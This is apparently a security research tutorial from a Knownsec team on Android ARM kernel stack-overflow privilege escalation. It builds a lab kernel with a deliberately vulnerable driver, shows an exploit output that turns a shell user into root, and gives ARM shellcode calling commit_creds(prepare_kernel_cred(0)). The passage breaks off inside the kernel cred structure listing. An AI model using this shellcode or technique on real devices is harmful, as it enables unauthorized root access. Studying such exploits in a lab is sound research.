**Author: Hcamael@Knownsec 404 Team**  
**Chinese Version:**
# Introduction
There is very little information about the simplest exploits of stack overflow
in Android kernel, and the new version of the kernel has a big difference.
It’s very easy under the circumstances of x86 instruction set, but the arm
instruction set is very different, so I encountered many problems.
This article is about Linux kernel pwn. The kernel that can be studied is just
privilege escalation, among which what has been studied most is the Linux
system privilege escalation of x86 and arm instruction set. The Linux system
privilege escalation of arm instruction set is basically Android root and iOS
jailbreak, while there is a few about mips instruction set, which may because
there are few application scenes.
# Preparations
## Android kernel compilation
### Download related source code dependencies
It is very troublesome to clone directly and compile under the git directory
because the Android kernel source code is goldfish[1]. If you want to study
that version, you can download the "tar.gz" for that branch directly.
The download addresses of the tools used in this article are as follows:
  * Source code:
  * Cross-compiler:
  * One-click compilation script:
PS: If git clone is slow, you can use the domestic mirror to speed up:
`s/android.googlesource.com/aosp.tuna.tsinghua.edu.cn/`
    # 下载源码
    $ wget https://android.googlesource.com/kernel/goldfish/+archive/android-goldfish-3.10.tar.gz
    $ tar zxf goldfish-android-goldfish-3.10.tar.gz
    # 下载编译工具
    $ git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.6
    # 下载一键编译脚本
    $ git clone https://android.googlesource.com/platform/prebuilts/qemu-kernel/
    # 只需要kernel-toolchain和build-kernel.sh
    $ cp qemu-kernel/build-kernel.sh goldfish/
    $ cp -r qemu-kernel/kernel-toolchain/ goldfish/
### Modify the kernel
When I learn the Android kernel pwn at the beginning, I have studied a project
on Github [3], which relies on the old kernel. It is estimated that the kernel
is below Android 3.4, and there are various problems in 3.10 or above, so I
made some modifications myself, and opened a [Github
source](https://github.com/Hcamael/android_kernel_pwn "Github source") as
well.
There are two points to modify the kernel source code:
(1) Add debug symbols
Firstly, you need to know which version to compile. I have compiled is a
32-bit Android kernel by using `goldfish_armv7`, and the configuration files
are: `arch/arm/configs/goldfish_armv7_defconfig`.
But I don't know why there is no such configuration file in 3.10, but there is
no problem to use ranchu:
To add debug symbols to the kernel just needs to add `CONFIG_DEBUG_INFO=y` in
the above configuration file. If it is goldfish, you need to add by yourself.
There are already debug symbols in the default configuration of ranchu, so you
don't need to modify it.
(2) Add drivers that contain vulnerabilities
This article is intended to study Android privilege escalation exploits, so I
add a driver that contains stack overflow by myself, and the steps are to
learn how to add the driver written by yourself.
Copy the `vulnerabilities/` directory in the Github project that I’ve
mentioned before to the driver directory of the kernel source code.
    $ cp vulnerabilities/ goldfish/drivers/
Modify Makefile:
    $ echo "obj-y += vulnerabilities/" >> drivers/Makefile
After importing the environment variables, compile with one-click compilation
script:
    $ export PATH=/root/arm-linux-androideabi-4.6/bin/:$PATH
    $ ./build-kernel.sh --config="ranchu"
PS: I encountered a problem when reproducing the environment in docker, you
can refer to:
The compiled kernel is in the `/tmp/qemu-kernel` directory. There are two
files: one is zImage--the kernel boot image; the other one is vmlinux--the
kernel binary file, which is either used to analyze the kernel IDA or to
provide symbolic information to gdb.
## Preparations for Android simulation environment
Having compiled the kernel, it’s time for Android environment. You can use
Android Studio [2] directly, but if you don't develop it, it seems that Studio
is too bloated, and it will take a long time to download. Fortunately, the
official command line tools are available, and you can only download it if you
think Studio is too big.
PS: Remember to install java. The latest version of java 11 cannot be used,
and I use java 8.
Create a directory and put the downloaded tools in it.
    $ mkdir android_sdk
    $ mv tools android_sdk/
Firstly you need to install some tools via `tools / bin / sdkmanager`.
    # 用来编译android binary(exp)的，如果直接用arm-liunx-gcc交叉编译工具会缺一些依赖，解决依赖太麻烦了，还是用ndk一把梭方便
    $ ./bin/sdkmanager --install "ndk-bundle"
    # android模拟器
    $ ./bin/sdkmanager --install "emulator"
    # avd
    $ ./bin/sdkmanager --install "platforms;android-19"
    $ ./bin/sdkmanager --install "system-images;android-19;google_apis;armeabi-v7a"
    # 其他
    $ ./bin/sdkmanager --install "platform-tools"
PS: Because it is 32-bit, so I choose armeabi-v7a.
And I have tested Android-19, 24, 25, and found that in Android-24, 25, the
driver that contains the vulnerability is only accessible to privileged users.
Not having carefully analyzed the reason, I use the lower version of
Android-19.
Create an Android virtual device:
    ./bin/avdmanager create avd -k "system-images;android-19;google_apis;armeabi-v7a" -d 5 -n "kernel_test"
Start up:
    $ export kernel_path=ranchu_3.10_zImage
    或者
    $ export kernel_path=goldfish_3.10_zImage
    $ ./emulator  -show-kernel -kernel $kernel_path -avd kernel_test -no-audio -no-boot-anim -no-window -no-snapshot -qemu  -s
Test the exp I write:
    $ cd ~/goldfish/drivers/vulnerabilities/stack_buffer_overflow/solution
    $ ./build_and_run.sh
Run with normal users after compiling:
    shell@generic:/ $ id
    id
    uid=2000(shell) gid=1007(log) context=u:r:init_shell:s0
    shell@generic:/ $ /data/local/tmp/stack_buffer_overflow_exploit
    /data/local/tmp/stack_buffer_overflow_exploit
    start
    shell@generic:/ # id
    id
    uid=0(root) gid=0(root) context=u:r:kernel:s0
# Research on Android kernel privilege escalation
My environment is derived from the AndroidKernelExploitationPlayground project
[3], but the actual test found that it may rely on the 3.4 kernel in the
project, while the current emulator requires the kernel version to be greater
than or equal to 3.10.
There are many changes from kernel 3.4 to 3.10. Firstly, some functions in the
kernel were deleted and modified, so the driver code needs to be changed.
Secondly, the kernel 3.4 does not turn on the PXN protection. In kernel mode,
it can jump to the memory space of user mode to execute the code. Therefore,
the exp given in the project is to use shellcode, but in the 3.10 kernel, PXN
protection is enabled, and shellcode in user mode memory cannot be executed.
## Ideas of privilege escalation
There is only one purpose to study kernel pwn-- privilege escalation. So how
do you change permissions from normal users to privileged users in Linux?
The general shellcode for privilege escalation is as follows:
    asm
    (
    "    .text\n"
    "    .align 2\n"
    "    .code 32\n"
    "    .globl shellCode\n\t"
    "shellCode:\n\t"
    // commit_creds(prepare_kernel_cred(0));
    // -> get root
    "LDR     R3, =0xc0039d34\n\t"   //prepare_kernel_cred addr
    "MOV     R0, #0\n\t"
    "BLX     R3\n\t"
    "LDR     R3, =0xc0039834\n\t"   //commit_creds addr
    "BLX     R3\n\t"
    "mov r3, #0x40000010\n\t"
    "MSR    CPSR_c,R3\n\t"
    "LDR     R3, =0x879c\n\t"     // payload function addr
    "BLX     R3\n\t"
    );
There are three steps in this shellcode privilege escalation:
  1. `prepare_kernel_cred(0)`: create a privileged user-- cred.
  2. `commit_creds(prepare_kernel_cred(0));`: set the current user cred to the privileged user cred.
  3. `MSR CPSR_c,R3`: switch from kernel mode back to user mode(you can search online for more details about this instruction and CPSR register)
Having switched back to user mode, the permissions of the current program have
become root, and you can execute `/bin/sh` at this time.
Continuing further research, it involves three structures of the kernel:
    $ cat ./arch/arm/include/asm/thread_info.h
    ......
    struct thread_info {
            ......
            struct task_struct      *task;          /* main task structure */
           ......
    };
    ......
    $ cat ./include/linux/sched.h
    ......
    struct task_struct {
            ......
            const struct cred __rcu *real_cred;
            ......
    };
    ......
    $ cat ./include/linux/cred.h
    ......
    struct cred {
            atomic_t        usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
            atomic_t        subscribers;    /* number of processes subscribed */
            void            *put_addr;
            unsigned        magic;
    #define CRED_MAGIC      0x43736564
    #define CRED_MAGIC_DEAD 0x44656144
    #endif
            kuid_t          uid;            /* real UID of the task */
            kgid_t          gid;            /* real GID of the task */
            kuid_t          suid;           /* saved UID of the task */
            kgid_t          sgid;           /* saved GID of the task */
            kuid_t          euid;           /* effective UID of the task */
            kgid_t          egid;           /* effective GID of the task */
            kuid_t          fsuid;          /* UID for VFS ops */
            kgid_t          fsgid;          /* GID for VFS ops */
            unsigned        securebits;     /* SUID-less security management */
            kernel_cap_t    cap_inheritable; /* caps our children can inherit */
            kernel_cap_t    cap_permitted;  /* caps we're permitted */
            kernel_cap_t    cap_effective;  /* caps we can actually use */